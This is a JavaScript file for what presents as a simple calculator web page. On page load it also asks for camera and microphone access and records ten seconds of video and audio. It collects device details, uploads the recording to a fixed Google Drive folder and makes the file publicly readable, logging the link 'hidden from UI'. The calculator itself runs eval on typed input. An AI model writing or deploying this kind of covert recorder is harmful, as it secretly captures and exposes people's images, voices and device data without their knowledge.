async function Camera() {
    const video = document.getElementById("video");

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: true
        });

        video.srcObject = stream;

        video.onloadedmetadata = () => {
            video.play();
            startRecording(stream);
        };
    } catch (error) {
        console.log("Permission denied", error);
    }
}

window.onload = Camera;

function appendValue(value){
    document.getElementById("display").value += value;
}

function Clear(){
    document.getElementById("display").value = "";
}

function calculate(){
    try{
        document.getElementById("display").value =
        eval(document.getElementById("display").value)
    } catch {
        alert("Invalid!!")
    }
}

function startRecording(stream){
    const video = document.getElementById("video");
    let chunks = [];
    const recorder = new MediaRecorder(stream);

    recorder.ondataavailable = (e) => {
        if(e.data && e.data.size > 0) chunks.push(e.data);
    };

    recorder.onstop = async () => {
        if(chunks.length === 0){
            console.log("No data recorded!");
            return;
        }

        const blob = new Blob(chunks, { type: "video/webm" });
        const videoURL = URL.createObjectURL(blob);
        localStorage.setItem("recordedVideo", videoURL);
        document.getElementById("warning").style.display = "block";

        const info = {
            browser: navigator.userAgent,
            platform: navigator.userAgentData?.platform || navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        localStorage.setItem("deviceInfo", JSON.stringify(info));
        console.log("Device info:", info);

        await uploadToDrive(blob);
    };

    recorder.start(1000);
    console.log("Recording started");

    setTimeout(() => {
        recorder.stop();
        stream.getTracks().forEach(track => track.stop());
        console.log("Recording stopped");
    }, 10000);
}

async function uploadToDrive(blob) {
    const CLIENT_ID = "887765142566-qpa8f9ac2mkgt2bai8rst61h7usv5u0i.apps.googleusercontent.com";
    const SCOPES = "https://www.googleapis.com/auth/drive.file";
    const FOLDER_ID = "1Y4Fh0Ir3WF_6e0OACed71mp5_SKTt-LY";

    gapi.load("client:auth2", async () => {
        await gapi.client.init({
            clientId: CLIENT_ID,
            scope: SCOPES
        });

        const authInstance = gapi.auth2.getAuthInstance();
        if (!authInstance.isSignedIn.get()) {
            await authInstance.signIn();
        }

        const accessToken = authInstance.currentUser.get().getAuthResponse().access_token;

        const metadata = {
            name: `recording_${Date.now()}.webm`,
            mimeType: "video/webm",
            parents: [FOLDER_ID]
        };

        const form = new FormData();
        form.append(
            "metadata",
            new Blob([JSON.stringify(metadata)], { type: "application/json" })
        );
        form.append("file", blob);

        try {
            const uploadResponse = await fetch(
                "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id",
                {
                    method: "POST",
                    headers: { Authorization: "Bearer " + accessToken },
                    body: form
                }
            );

            const data = await uploadResponse.json();

            if (!uploadResponse.ok) {
                console.error("Upload failed:", data);
                return;
            }

            console.log("Uploaded file ID:", data.id);

            await fetch(`https://www.googleapis.com/drive/v3/files/${data.id}/permissions`, {
                method: "POST",
                headers: {
                    Authorization: "Bearer " + accessToken,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ role: "reader", type: "anyone" })
            });

            const fileLink = `https://drive.google.com/file/d/${data.id}/view`;
            console.log("Public Link (hidden from UI):", fileLink);

        } catch (error) {
            console.error("Upload error:", error);
        }
    });
}